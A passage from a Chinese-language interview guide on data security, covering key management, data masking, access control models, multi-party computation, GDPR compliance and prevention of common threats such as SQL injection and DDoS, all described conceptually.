title="密钥管理："></a><strong>密钥管理</strong>：</h4></li><li><p>了解候选人对密钥生成、存储、分发和更新等密钥管理环节的认知，例如，“在企业级数据加密中，如何确保密钥的安全性？”</p></li><li><p>密钥生成环节的安全性</p><ul><li><strong>使用可靠的密钥生成工具</strong>：选择经过严格测试和认证的密码学库或工具来生成非对称加密密钥对（公钥和私钥）。例如，在许多编程语言中，都有成熟的密码学库，像 Python 中的<code>cryptography</code>库，它利用操作系统提供的安全随机数生成器来创建高质量的密钥对。这些库会确保生成的密钥在数学上具有足够的强度，以抵抗密码分析攻击。</li><li><strong>遵循密码学标准</strong>：按照既定的密码学标准来生成密钥。以 RSA 算法为例，密钥生成过程涉及到选择两个大素数，其大小和选取方式应该符合相关的安全建议。一般来说，密钥长度越长，安全性越高。目前，推荐的 RSA 密钥长度至少为 2048 位，以应对日益增长的计算能力和攻击手段。这是因为较长的密钥使得攻击者通过分解大整数（RSA 算法安全性的基础在于分解大整数的困难性）来获取私钥变得极其困难。</li></ul></li><li><p>私钥存储的安全措施</p><ul><li><strong>硬件安全模块（HSM）存储</strong>：硬件安全模块是保护私钥的一种非常有效的物理设备。它提供了一个隔离的、防篡改的环境来存储私钥。例如，一些金融机构会使用符合 FIPS（联邦信息处理标准）认证的 HSM 来存储用于数字签名和加密通信的 RSA 私钥。这些 HSM 设备通常具有物理防护机制，如抗冲击、抗电磁干扰等，并且通过严格的访问控制来确保只有授权的操作才能访问私钥。</li><li><strong>加密存储私钥</strong>：如果不使用 HSM，也应该对私钥进行加密存储。可以使用对称加密算法（如 AES）来加密私钥，加密密钥（称为密钥加密密钥，KEK）则通过安全的方式存储（如存储在受保护的密码库或安全的硬件设备中）。这样，即使存储私钥的设备被入侵，攻击者如果没有获取 KEK，也无法解密私钥。例如，在一个企业的密钥管理系统中，将 RSA 私钥加密后存储在企业内部的安全服务器上，只有经过授权的用户通过提供正确的 KEK 才能解密和使用私钥。</li></ul></li><li><p>公钥分发的安全考虑</p><ul><li><strong>数字证书机制</strong>：在公钥分发过程中，为了确保公钥的真实性和完整性，通常会使用数字证书。数字证书是由权威的证书颁发机构（CA）颁发的，它将公钥与实体（如企业、个人等）的身份信息绑定在一起。例如，在网站的 SSL&#x2F;TLS 加密通信中，网站的公钥会包含在数字证书中。当用户访问网站时，浏览器会验证证书的有效性，包括检查证书是否由信任的 CA 颁发、证书是否过期等。这样可以防止攻击者伪造公钥来进行中间人攻击。</li><li><strong>安全的通信渠道分发公钥</strong>：在一些情况下，需要直接分发公钥而不是通过数字证书。这时，应该使用安全的通信渠道，如通过 SSL&#x2F;TLS 加密的网络连接或者使用安全的文件传输协议（如 SFTP）。例如，在企业内部的加密通信系统中，部门之间分发用于加密消息的公钥时，应该确保通信渠道的安全性，防止公钥在传输过程中被篡改。</li></ul></li><li><p>密钥更新与吊销机制</p><ul><li><strong>定期更新密钥对</strong>：为了应对潜在的安全风险，如密码学算法的破解进展或者密钥可能的泄露风险，应该定期更新非对称加密密钥对。例如，对于企业用于数字签名的 RSA 密钥对，根据业务的安全需求，可以设定每一年或两年更新一次。更新过程需要确保新密钥的安全生成、存储和分发，同时要妥善处理旧密钥的吊销和存档。</li><li><strong>密钥吊销列表（CRL）与在线证书状态协议（OCSP）</strong>：在使用数字证书的场景下，需要建立密钥吊销机制。当私钥可能被泄露或者不再有效时，应该及时吊销对应的公钥证书。可以通过维护密钥吊销列表（CRL）或者使用在线证书状态协议（OCSP）来实现。例如，当企业发现用于网站加密的私钥可能被泄露时，会将对应的数字证书添加到 CRL 中，浏览器在验证证书时会检查 CRL，从而防止攻击者继续使用已吊销的证书进行非法活动。</li></ul></li><li><p>访问控制与审计</p><ul><li><strong>严格的访问控制策略</strong>：对非对称加密密钥的访问应该实施严格的基于角色的访问控制（RBAC）策略。只有经过授权的人员（如企业的安全管理员、具有特定业务需求的开发人员等）才能访问和使用密钥。例如，在一个电子签名系统中，只有被授权的签名者才能使用对应的私钥进行数字签名，其他人员无法访问该私钥。</li><li><strong>密钥访问审计与监控</strong>：建立密钥访问的审计和监控机制，记录所有与密钥访问相关的活动，包括访问时间、访问者身份、操作类型（如密钥生成、使用、更新等）。通过对这些审计记录的分析，可以及时发现异常的密钥访问行为，例如，发现某个未经授权的用户试图访问私钥，就可以及时采取措施进行调查和防范。</li></ul></li></ul><h3 id="数据脱敏技术"><a href="#数据脱敏技术" class="headerlink" title="数据脱敏技术"></a>数据脱敏技术</h3><ul><li><h4 id="脱敏方法与策略"><a href="#脱敏方法与策略" class="headerlink" title="脱敏方法与策略"></a><strong>脱敏方法与策略</strong></h4></li><li><p>可以问 “请列举几种常见的数据脱敏方法，并说明它们在保护敏感数据中的作用。” 如数据屏蔽、数据替换、数据扰动等方法。</p></li><li><p>数据屏蔽（Masking）</p><ul><li><strong>方法描述</strong>：数据屏蔽是一种常见的数据脱敏方法，它通过用特定的字符或符号替换敏感数据的部分或全部内容来隐藏真实信息。例如，对于手机号码 “138xxxxxxxx”，可以将中间四位数字用 “<em>” 替换，变成 “138</em>***xxxx”；对于银行卡号，可以只显示开头几位和结尾几位数字，中间部分用 “XXX” 替换。</li><li><strong>保护作用</strong>：这种方法能够在保持数据格式完整性的同时，有效地隐藏敏感信息。在数据展示或测试环境中使用时，不会泄露真实的敏感数据，同时又能让用户或测试人员对数据的大致格式和类型有直观的了解。例如，在软件开发的测试环境中，使用屏蔽后的敏感数据可以确保测试人员不会意外接触到真实的用户隐私信息，同时还能进行功能测试，如验证数据输入框的格式是否正确等。</li></ul></li><li><p>数据替换（Substitution）</p><ul><li><strong>方法描述</strong>：数据替换是将敏感数据替换为虚构的或通用的数据。例如，在处理客户姓名时，可以将真实姓名替换为 “张三”“李四” 等通用名字；对于地理位置信息，可以将具体的详细地址替换为大致的区域，如将 “北京市朝阳区 XX 小区 XX 号楼 XX 单元 XX 室” 替换为 “北京市朝阳区”。</li><li><strong>保护作用</strong>：通过替换敏感数据，可以避免真实信息的泄露，同时在一定程度上保持数据的可用性。在数据分析场景中，这种方法可以用于统计分析等用途。例如，在分析用户地域分布时，使用替换后的地理位置数据可以得到大致的区域分布情况，而不会涉及具体的用户隐私地址。</li></ul></li><li><p>数据扰动（Perturbation）</p><ul><li><strong>方法描述</strong>：数据扰动是在原始数据的基础上，通过添加噪声或随机化等方式对数据进行轻微修改。例如，对于年龄数据，如果原始数据是 30 岁，可以在一个合理的范围内（如 ±3 岁）添加随机噪声，得到一个扰动后的年龄数据，如 32 岁。对于数值型数据，还可以采用更复杂的统计方法进行扰动，如根据数据的分布特征添加符合一定分布规律的噪声。</li><li><strong>保护作用</strong>：这种方法可以在不改变数据整体统计特征的前提下，保护敏感数据的隐私。在数据分析和数据挖掘场景中，它允许在保护隐私的情况下，仍然能够利用数据进行一些宏观的统计分析和模型训练。例如，在进行市场调研数据分析时，通过数据扰动后的用户收入数据，仍然可以大致了解用户收入的分布情况，同时又能防止个别用户收入信息的泄露。</li></ul></li><li><p>数据匿名化（Anonymization）</p><ul><li><strong>方法描述</strong>：数据匿名化是通过删除或转换能够直接或间接识别个人身份的信息，使得数据主体无法被识别。这可能涉及到删除姓名、身份证号码、联系方式等直接标识符，同时也会对一些准标识符（如性别、年龄、职业等组合起来可能识别个人身份的信息）进行处理。例如，采用 k - 匿名技术，确保在数据集中每个个体的信息与至少其他个个体的信息相同，从而无法通过这些信息单独识别出某一个体。</li><li><strong>保护作用</strong>：数据匿名化是一种较为彻底的数据保护方法，它使得数据在使用过程中不会泄露个人隐私信息。在大数据分析和数据共享场景中，匿名化后的数据可以被广泛地用于研究、统计等合法用途。例如，医疗机构在共享患者的医疗数据用于医学研究时，通过匿名化处理，可以在不侵犯患者隐私的情况下，为医学研究提供有价值的数据支持。</li></ul></li><li><p>数据加密（Encryption）</p><ul><li><strong>方法描述</strong>：虽然加密本身主要用于数据的保密性保护，但在某些数据脱敏场景下也可以作为一种特殊的数据脱敏方法。通过加密敏感数据，只有拥有解密密钥的授权用户才能访问真实数据。例如，对于企业的核心商业机密数据，采用高级加密标准（AES）等加密算法进行加密存储，在需要使用数据时，通过严格的密钥管理和授权流程进行解密。</li><li><strong>保护作用</strong>：加密提供了一种高强度的数据保护方式。在数据存储和传输过程中，即使数据被非法获取，没有解密密钥，攻击者也无法获取敏感数据的真实内容。在数据共享场景中，如果接收方没有解密密钥，只能得到加密后的密文，从而保护了数据的隐私。例如，在云计算环境中，企业将敏感数据存储在云端，通过加密可以确保云服务提供商无法获取数据的真实内容。</li></ul></li><li><h4 id="脱敏效果评估"><a href="#脱敏效果评估" class="headerlink" title="脱敏效果评估"></a><strong>脱敏效果评估</strong></h4></li><li><p>关注候选人是否能够评估数据脱敏后的可用性和安全性之间的平衡，例如，“如何衡量数据脱敏后是否既能有效保护隐私，又能满足业务需求？”</p></li><li><p><strong>隐私保护效果衡量</strong></p><ul><li>隐私泄露风险评估<ul><li><strong>模拟攻击测试</strong>：通过模拟攻击者的行为来评估隐私泄露风险。例如，采用差分隐私中的隐私预算概念，在数据脱敏前后分别进行模拟攻击，计算攻击者能够获取敏感信息的概率变化。如果脱敏后攻击者获取隐私信息的概率显著降低，说明隐私保护有效。例如，对于金融交易数据，模拟黑客试图通过脱敏后的交易金额和时间戳来推断用户身份，若无法准确推断，则隐私保护有效。</li><li><strong>敏感信息识别难度衡量</strong>：评估经过脱敏处理后，敏感信息被识别的难度。例如，对于个人身份信息（姓名、身份证号等），可以使用信息熵等指标来衡量。信息熵越高，说明信息的不确定性越大，即敏感信息越难被识别。如将姓名脱敏为随机字符串后，计算其信息熵，若信息熵达到一定程度，表明隐私保护程度较高。</li></ul></li><li>合规性检查<ul><li><strong>参考法规和行业标准</strong>：依据相关的数据保护法规（如欧盟的 GDPR、中国的《数据安全法》）和行业特定标准（如医疗行业的 HIPAA）进行检查。确保数据脱敏后的处理方式符合法规对于隐私保护的最低要求。例如，医疗数据脱敏后，应确保患者的隐私信息不能被用于非授权的医疗研究或商业用途，符合 HIPAA 规定。</li><li><strong>隐私政策匹配度评估</strong>：对比企业内部的隐私政策与数据脱敏后的实际情况。企业的隐私政策通常规定了如何处理和保护用户数据，检查脱敏后的操作是否与隐私政策一致。例如，企业隐私政策声明不会泄露用户的地理位置信息，那么在数据脱敏后，地理位置信息应通过合适的方式（如精度降低或匿名化）进行保护。</li></ul></li></ul></li><li><p><strong>业务需求满足程度衡量</strong></p><ul><li>数据准确性评估<ul><li><strong>数据一致性检查</strong>：在数据脱敏后，检查数据的一致性。例如，在一个销售数据集中，脱敏后的销售金额和销售数量之间的乘积应该等于脱敏后的总销售额。对于关联数据，如客户订单信息和物流信息，检查它们之间的关联关系在脱敏后是否仍然正确。如果数据一致性能够得到保证，说明数据准确性在一定程度上得到维护，有利于业务操作。</li><li><strong>关键指标保留情况</strong>：确定业务关键指标在脱敏后是否仍然可用。例如，在市场调研数据中，对于消费者购买频率、品牌偏好等关键指标，通过对比脱敏前后的数据分布和统计特征，如均值、中位数、标准差等，评估这些指标是否能够准确反映业务情况。如果关键指标变化不大，说明数据脱敏没有对业务分析造成重大影响。</li></ul></li><li>数据可用性评估<ul><li><strong>数据分析和挖掘可行性</strong>：将脱敏后的数据用于实际的数据分析和挖掘任务，观察是否能够得到有意义的结果。例如，在一个客户关系管理系统中，使用脱敏后的数据进行客户细分（聚类分析）或客户流失预测（分类分析）。如果这些分析任务能够正常进行，并且得到的结果与使用原始数据得到的结果具有相似的业务指导意义，说明数据脱敏后的可用性较高。</li><li><strong>业务流程适应性评估</strong>：检查数据脱敏后是否能够顺利融入现有的业务流程。例如，在一个金融信贷审批流程中，脱敏后的用户信用数据应能够被信贷审批系统正常读取和处理，不会因为数据格式或内容的变化而导致业务流程中断或错误。如果数据脱敏后的格式和内容能够满足业务流程中各个环节的需求，如数据输入、查询、报表生成等，说明它能够很好地满足业务需求。</li></ul></li></ul></li><li><h3 id="数据访问控制技术"><a href="#数据访问控制技术" class="headerlink" title="数据访问控制技术"></a>数据访问控制技术</h3><ul><li><strong>访问控制模型</strong>：考查对常见访问控制模型（如 RBAC - 基于角色的访问控制、ABAC - 基于属性的访问控制）的理解，如 “请比较 RBAC 和 ABAC 模型的优缺点，并举例说明它们的应用场景。”<ol><li><strong>RBAC（基于角色的访问控制）模型</strong><ul><li>优点<ul><li><strong>简单易理解和管理</strong>：RBAC 模型的概念直观，易于理解。它将用户与角色相关联，角色再与权限相关联。例如，在一个企业的办公系统中，可创建 “员工”“部门经理”“系统管理员” 等角色。系统管理员只需将用户分配到相应角色，就能快速赋予用户一组权限，而不必为每个用户单独配置权限，大大简化了权限管理的复杂性。</li><li><strong>权限分配高效</strong>：当企业组织结构或业务流程发生变化时，只需要调整角色的权限，所有关联该角色的用户权限会自动更新。比如企业新增了一个业务模块，只需为 “部门经理” 这个角色添加对新模块的访问权限，所有部门经理用户就都能获得此权限。</li><li><strong>符合企业组织结构</strong>：RBAC 模型与企业的实际组织结构和分工紧密匹配。它能很好地反映企业中不同职位所拥有的权限范围，方便进行访问控制。例如，财务部门的员工通常有访问财务系统的权限，而通过 RBAC 可以很容易地将财务系统的相关权限赋予 “财务员工” 这一角色。</li></ul></li><li>缺点<ul><li><strong>角色定义可能过于僵化</strong>：RBAC 的角色是预先定义好的，在面对复杂多变的业务场景时可能不够灵活。例如，在一个项目型的工作环境中，员工可能会根据项目的不同阶段或任务临时需要不同的权限，而 RBAC 很难快速满足这种动态变化的权限需求。</li><li><strong>权限颗粒度有限</strong>：如果需要对权限进行非常精细的控制，RBAC 可能会力不从心。例如，对于一个文件共享系统，可能需要根据文件的类型、创建时间、所属部门等多个因素来确定用户是否能访问，单纯依靠 RBAC 角色来分配权限会比较困难。</li></ul></li><li>应用场景<ul><li><strong>企业办公系统</strong>：如企业资源规划（ERP）系统、客户关系管理（CRM）系统等。在 ERP 系统中，可定义 “采购人员”“销售人员”“仓库管理人员” 等角色，每个角色具有相应的系统操作权限，如采购人员可以创建采购订单、销售人员可以查看客户信息和销售记录、仓库管理人员可以管理库存等。</li><li><strong>内部网络资源访问控制</strong>：在企业内部网络中，通过 RBAC 控制员工对不同部门共享文件夹、打印机等资源的访问。例如，“行政部门员工” 角色可以访问行政部门的共享文件和打印机，而其他部门员工则没有此权限。</li></ul></li></ul></li><li><strong>ABAC（基于属性的访问控制）模型</strong><ul><li>优点<ul><li><strong>高度灵活和动态</strong>：ABAC 根据用户、资源、环境等多个属性来决定访问权限，能够很好地适应复杂多变的业务需求。例如，在一个云存储服务中，用户的访问权限可以根据用户的身份（如普通用户、高级用户）、文件属性（如文件类型、文件所有者）、访问时间（如工作时间、非工作时间）等多个属性来动态确定。</li><li><strong>精细的权限控制</strong>：ABAC 可以实现非常精细的权限控制，能够考虑到各种复杂的因素。例如，在一个医疗信息系统中，医生访问患者病历的权限可以根据医生的科室、患者的病情严重程度、病历的创建日期等多个属性来确定，确保只有相关的医生在合适的情况下才能访问患者的特定病历。</li><li><strong>上下文感知能力强</strong>：ABAC 能够考虑访问请求的上下文信息，如网络环境、设备类型等。例如，对于一个银行的网上银行系统，根据用户登录的设备类型（是通过安全的银行专用设备还是普通的移动设备）、网络环境（是在银行内部网络还是外部公共网络）等属性来动态调整用户的访问权限，提高系统的安全性。</li></ul></li><li>缺点<ul><li><strong>复杂性高</strong>：ABAC 的策略配置和管理相对复杂，需要考虑多个属性及其组合，这对管理员的要求较高。例如，在一个大型企业的复杂系统中，要定义基于用户、资源、时间、地点等多个属性的访问策略，需要花费大量的时间和精力来设计和维护这些策略。</li><li><strong>性能开销较大</strong>：由于每次访问请求都需要评估多个属性和策略，可能会对系统性能产生一定的影响。特别是在高并发的场景下，这种性能开销可能会更加明显。例如，在一个拥有大量用户的电商平台，每次用户访问商品信息或进行交易操作时，都需要对用户的多个属性（如会员等级、信用等级、购买历史等）和商品的属性（如商品类别、促销状态等）进行评估，以确定访问权限，这可能会导致系统响应时间延长。</li></ul></li><li>应用场景<ul><li><strong>云计算和大数据环境</strong>：在云计算平台中，根据用户、资源（如虚拟机、存储卷）和环境（如数据中心位置、网络带宽）等属性来控制用户对云资源的访问。在大数据平台中，对数据的访问权限可以根据数据的敏感性（如个人隐私数据、商业机密数据）、用户的角色和数据处理任务的属性等来动态确定。</li><li><strong>物联网（IoT）系统</strong>：在物联网系统中，设备的访问权限可以根据设备的类型（如传感器、执行器）、设备的所有者、设备的运行状态、网络连接情况等属性来控制。例如，只有经过授权的用户在设备正常运行且网络连接安全的情况下才能访问和控制智能门锁设备。</li></ul></li></ul></li></ol></li><li><strong>权限管理系统</strong>：询问候选人对权限管理系统的设计、实施和维护的经验，例如，“在设计一个权限管理系统时，需要考虑哪些关键因素？”</li></ul></li><li><p>数据备份与恢复技术</p><ul><li><strong>备份策略与方案</strong>：例如，“请描述一下企业数据中心常用的备份策略，如全量备份、增量备份和差异备份的特点和适用场景。”</li><li><strong>恢复流程与技术</strong>：了解候选人对数据恢复流程的熟悉程度，如 “在遇到数据丢失或损坏的情况下，如何快速有效地恢复数据？”</li></ul></li><li><p>安全多方计算和同态加密（如果职位要求涉及高级技术）</p><ul><li><p><strong>原理与应用场景</strong>：可以问 “请解释安全多方计算的基本原理，并举例说明它在数据共享场景中的应用。” 对于同态加密，可问 “同态加密是如何实现在密文上进行计算的？请举例说明其在云计算环境中的潜在应用。”</p><p>安全多方计算的基本原理是允许多个参与方在不泄露各自输入隐私数据的前提下，共同计算一个函数的结果. 以下是对其基本原理及相关技术的介绍 ：</p><ul><li><strong>秘密共享</strong>：将一个秘密分割成多个部分，即份额，每个份额分给不同的参与方。只有当一定数量的份额组合时，秘密才能被重建。例如，将一个数据值拆分成三个份额分别给 A、B、C 三方，单独任何一方都无法得知原始数据，只有当至少两方合在一起才能恢复出原始数据，从而保证了数据在存储和传输过程中的安全性。</li><li><strong>混淆电路</strong>：把任何函数的计算问题转化为由 “与” 门、“或” 门和 “非” 门组成的布尔逻辑电路，再利用加密技术构建加密版本的布尔逻辑电路。参与方通过交换混淆后的电路信息，在不泄露原始数据的情况下进行计算。</li><li><strong>同态加密</strong>：允许对密文进行计算，计算结果在解密后与在明文上直接计算的结果相同。同态加密分为部分同态加密、浅同态加密和全同态加密，全同态加密能实现任意次的加法和乘法同态运算，可在不解密数据的情况下对加密数据进行各种数学运算，大大提高了数据处理的灵活性和安全性。</li></ul><p>以下是安全多方计算在数据共享场景中的一些应用：</p><h3 id="金融领域"><a href="#金融领域" class="headerlink" title="金融领域"></a>金融领域</h3><ul><li><strong>联合风险评估</strong>：不同金融机构之间需要共享客户数据来更准确地评估客户的信用风险，但又不能泄露各自客户的隐私信息 。通过安全多方计算，各机构可以在加密的状态下共享客户的相关数据，如收入、资产、信用记录等，然后共同计算客户的风险评分，而无需将原始数据暴露给其他机构。例如，银行 A、B、C 分别拥有客户的部分财务信息和交易记录，它们使用安全多方计算技术，在不公开这些敏感数据的前提下，共同计算出客户的综合风险评估结果，从而决定是否批准客户的贷款申请，既保护了客户隐私，又提高了风险评估的准确性.</li><li><strong>金融市场数据分析</strong>：多家金融机构或投资公司可能希望联合分析市场数据，以获取更全面的市场趋势和投资机会，但又担心数据泄露会影响自身竞争力。利用安全多方计算，各方可以在保护自身数据隐私的情况下，共同对市场数据进行挖掘和分析，如计算市场波动率、相关性等指标，为投资决策提供更有力的支持.</li></ul><h3 id="医疗领域"><a href="#医疗领域" class="headerlink" title="医疗领域"></a>医疗领域</h3><ul><li><strong>多中心医学研究</strong>：不同医院或研究机构可能收集了大量的患者数据，包括病历、检查结果、基因数据等。在进行医学研究时，需要整合这些数据，但又要严格保护患者的隐私。通过安全多方计算，各机构可以在不泄露患者具体信息的情况下，共同对数据进行统计分析、模型训练等操作，例如研究某种疾病的遗传因素，各方可以在加密数据上进行联合计算，找出疾病相关的基因标记，促进医学研究的发展，同时确保患者隐私得到充分保护.</li><li><strong>远程医疗诊断</strong>：在远程医疗中，患者的医疗数据可能分布在不同的医疗机构或设备中。医生需要综合这些数据来进行准确的诊断，但又不能直接获取患者在其他机构的原始数据。安全多方计算可以使各方在保护数据隐私的前提下，共享和整合患者数据，为医生提供更全面的诊断依据，提高远程医疗的质量和可靠性 。</li></ul><h3 id="商业领域"><a href="#商业领域" class="headerlink" title="商业领域"></a>商业领域</h3><ul><li><strong>供应链数据共享</strong>：在供应链中，各环节的企业拥有不同的敏感数据，如生产计划、库存水平、销售数据等。通过安全多方计算，这些企业可以在不暴露自身核心数据的情况下，与其他企业共享部分数据，实现供应链的协同优化，如共同制定生产计划、优化库存管理等，提高整个供应链的效率和竞争力。</li><li><strong>广告投放与精准营销</strong>：广告商和互联网平台希望通过共享用户数据来实现更精准的广告投放，但又要保护用户的隐私。利用安全多方计算，双方可以在加密的用户数据上进行联合计算，找出目标用户群体，制定个性化的广告投放策略，而不会泄露用户的具体个人信息，提高广告效果的同时保护用户隐私.</li></ul></li></ul></li></ul><ol><li><p>数据安全法规与合规性</p><ul><li>法律法规知识<ul><li><strong>通用法规</strong>：考查候选人对数据保护相关法律法规的了解，如 “请列举一些国内和国际上重要的数据保护法规，如欧盟的 GDPR、中国的《数据安全法》，并说明它们对企业数据安全的主要要求。”</li><li><strong>行业特定法规</strong>：针对特定行业（如金融、医疗、电商），询问候选人对行业数据安全法规的熟悉程度，例如，“在金融行业，数据安全要遵循哪些特殊的监管要求？”</li></ul></li><li>合规性实践<ul><li><strong>合规框架搭建</strong>：了解候选人如何帮助企业搭建数据安全合规框架，如 “请描述一下你在之前的工作中是如何协助企业建立符合 GDPR 要求的数据安全管理体系的？”<ol><li><strong>数据映射与清单编制</strong><ul><li><strong>识别数据资产</strong>：首先，我会与企业的各个部门（如市场、销售、人力资源等）合作，开展数据资产清查工作。这包括识别企业收集、存储和处理的所有个人数据类型，例如客户姓名、联系方式、购买历史、员工个人信息等。通过与业务流程负责人的访谈、审查文档和系统扫描等方式，全面梳理企业内的数据流动路径。</li><li><strong>绘制数据流程图</strong>：根据收集到的信息，绘制详细的数据流程图，展示数据从产生、收集、存储、处理到最终删除或归档的全过程。例如，在电商企业中，会详细描绘客户下单过程中数据如何从网页表单收集，经过支付系统处理，存储在订单数据库，以及后续用于营销目的的处理流程。这些流程图有助于直观地理解数据的生命周期和涉及的系统、人员，为后续的合规性评估和控制措施实施提供基础。</li></ul></li><li><strong>隐私政策制定与更新</strong><ul><li><strong>符合 GDPR 原则的政策制定</strong>：基于 GDPR 的要求，协助企业制定或更新隐私政策。确保政策明确说明数据主体（如客户、员工）的权利，包括访问权、更正权、删除权（被遗忘权）等。例如，在隐私政策中清晰地告知客户如何申请访问自己的个人数据，以及企业将在多长时间内响应客户的请求。同时，政策要说明数据收集的目的、合法性基础（如同意、合同必要、合法利益等）和数据共享的范围。</li><li><strong>隐私政策的透明度和易理解性</strong>：注重隐私政策的表述方式，使其易于被数据主体理解。避免使用过于复杂的法律术语，采用通俗易懂的语言向用户解释数据处理活动。并且通过企业网站、移动应用等渠道显著地展示隐私政策链接，确保用户在提供个人数据之前能够方便地查阅。</li></ul></li><li><strong>数据主体权利保障机制建立</strong><ul><li><strong>访问和更正请求处理流程</strong>：建立一套高效的流程来处理数据主体的访问和更正请求。指定专门的团队或人员负责接收和处理这些请求，明确每个环节的时间限制和操作规范。例如，规定在收到客户访问个人数据的请求后，必须在 30 天内提供相应的数据副本。对于更正请求，要确保在核实身份后及时更新相关数据记录。</li><li><strong>删除权（被遗忘权）执行程序</strong>：针对数据主体的删除请求，制定详细的执行程序。这涉及到对数据存储系统的全面检索，确保与该数据主体相关的所有数据，包括备份和存档数据，都能被安全地删除或匿名化处理。同时，要考虑到数据删除可能对其他业务流程产生的影响，如关联数据的清理和系统之间的同步。</li></ul></li><li><strong>数据安全措施实施</strong><ul><li><strong>技术安全控制</strong>：根据企业数据的敏感性和风险评估结果，实施一系列技术安全措施。包括加密敏感数据存储（如使用 AES 等加密算法对客户的个人信息数据库进行加密）、采用访问控制技术（如 RBAC 或 ABAC 模型来限制员工对数据的访问权限）和数据防泄露技术（如 DLP 工具来监控和防止数据意外或恶意泄露）。</li><li><strong>数据安全培训与意识提升</strong>：组织数据安全培训活动，提高全体员工的数据安全意识。培训内容包括 GDPR 的基本要求、数据保护的最佳实践、常见的安全威胁（如网络钓鱼、社会工程学攻击）以及员工在数据安全中的职责。通过案例分析、模拟演练等方式，使员工能够更好地理解和遵守数据安全规定。</li></ul></li><li><strong>数据处理合法性评估与记录保存</strong><ul><li><strong>合法性基础审查</strong>：对企业的数据处理活动进行合法性评估，确保每一项数据收集和处理行为都有合法的依据。这可能包括获得数据主体的明确同意（如在收集用户营销偏好数据时）、基于合同必要（如处理员工工资数据）或合法利益（如为了防止欺诈而处理客户交易数据）等情况。同时，记录下每一次数据处理活动的合法性基础，以备监管机构检查。</li><li><strong>记录保存要求满足</strong>：按照 GDPR 的规定，协助企业建立完善的记录保存制度。记录保存的数据包括数据处理活动的描述、数据主体的类别和数量、数据处理的目的、数据存储的位置和期限等信息。这些记录要以可被监管机构查阅的形式保存一定的时间（通常为数据处理活动结束后的数年）。</li></ul></li><li><strong>数据跨境传输管理</strong><ul><li><strong>跨境传输合法性评估</strong>：如果企业涉及数据跨境传输（如将欧盟境内收集的客户数据传输到欧盟境外的数据中心进行存储或处理），对跨境传输的合法性进行评估。确保跨境传输符合 GDPR 规定的合法性条件，如基于充分性认定（接收国的数据保护水平被欧盟认定为充分）、使用标准合同条款（SCCs）或基于约束性公司规则（BCRs）等方式。</li><li><strong>跨境传输安全保障措施</strong>：在跨境传输过程中，采取适当的安全保障措施，如对传输的数据进行加密、确保传输服务提供商遵守数据保护要求等。同时，要对跨境传输的数据进行跟踪和记录，包括传输的目的、接收方的信息、传输的数据内容和数量等，以确保数据在跨境过程中的安全性和合规性。</li></ul></li></ol></li><li><strong>合规审计与应对</strong>：询问关于合规审计的经验和应对措施，例如，“如果企业面临数据安全合规审计，你认为需要重点准备哪些方面的内容？如果发现不符合法规的情况，应该如何处理？”</li></ul></li></ul></li><li><p>数据安全工具与平台</p><ul><li>工具使用经验<ul><li><strong>数据安全工具列举</strong>：要求候选人列举并简单介绍一些常用的数据安全工具，如数据加密工具（如 VeraCrypt）、数据脱敏工具（如 ARX Data Anonymization Tool）、访问控制工具（如 Okta Identity Cloud）等。</li><li><strong>工具的实际操作</strong>：考查候选人对特定工具的实际操作能力，例如，“请描述一下你使用过的一款数据加密工具的加密流程，以及在操作过程中遇到的问题和解决方法。”</li></ul></li><li>平台集成与管理<ul><li><strong>安全工具集成</strong>：询问候选人如何将不同的数据安全工具集成到企业的 IT 系统中，如 “在企业现有信息系统中集成数据访问控制工具时，需要考虑哪些技术和管理方面的问题？”</li><li><strong>平台安全管理</strong>：了解候选人对数据安全平台的管理经验，例如，“在管理数据安全监控平台时，如何设置有效的安全策略和告警机制？”</li></ul></li></ul></li><li><p>数据安全威胁与应对策略</p><ul><li><p>威胁识别能力</p><ul><li><p><strong>常见威胁类型</strong>：考查候选人对常见数据安全威胁（如数据泄露、数据篡改、恶意软件攻击等）的识别能力，例如，“请列举一些可能导致企业数据泄露的常见方式，并说明如何预防。”</p></li><li><p><strong>网络攻击导致的数据泄露</strong></p><ul><li><p>恶意软件入侵</p><ul><li><strong>常见方式</strong>：攻击者通过钓鱼邮件、恶意软件下载链接或受感染的外部设备等途径，将病毒、木马、勒索软件等恶意程序植入企业的计算机系统。这些恶意软件一旦运行，就可以窃取敏感数据，如用户登录凭证、企业财务数据等。例如，员工不小心点击了一封看似来自公司领导的钓鱼邮件中的附件，附件中的恶意软件就会在后台悄悄运行，收集并发送数据。</li><li><strong>预防措施</strong>：安装可靠的反病毒软件和反恶意软件工具，并定期更新病毒库。对员工进行安全意识培训，教育他们如何识别钓鱼邮件，避免点击可疑的链接和下载不明来源的文件。同时，限制员工对外部设备（如 U 盘）的使用，如有必要，对外部设备进行安全扫描后再允许接入公司网络。</li></ul></li><li><p>黑客攻击（如 SQL 注入、DDoS 攻击）</p><ul><li><p>常见方式</p><p>：</p><ul><li><strong>SQL 注入</strong>：攻击者通过在输入框（如网站登录界面、搜索框）中输入恶意的 SQL 语句，利用 Web 应用程序对用户输入验证的漏洞，获取数据库中的敏感信息。例如，攻击者在一个电商网站的搜索框中输入特殊的 SQL 语句，绕过网站的权限验证，从而获取用户订单信息、信用卡号码等。</li><li><strong>DDoS 攻击（分布式拒绝服务攻击）</strong>：攻击者利用大量的僵尸主机向目标服务器发送海量请求，使服务器资源耗尽，无法正常提供服务。在攻击过程中，攻击者可能会趁机窃取数据或者通过其他方式获取服务器的访问权限，进而获取数据。</li></ul></li><li><p>预防措施</p><p>：</p><ul><li><strong>对于 SQL 注入</strong>：开发人员在编写代码时，要对用户输入进行严格的验证和过滤，使用参数化查询来防止 SQL 注入攻击。定期对 Web 应用程序进行安全漏洞扫描，如使用专业的漏洞扫描工具（如 Acunetix、Netsparker 等）来检测和修复可能存在的 SQL 注入漏洞。</li><li><strong>对于 DDoS 攻击</strong>：企业可以采用 DDoS 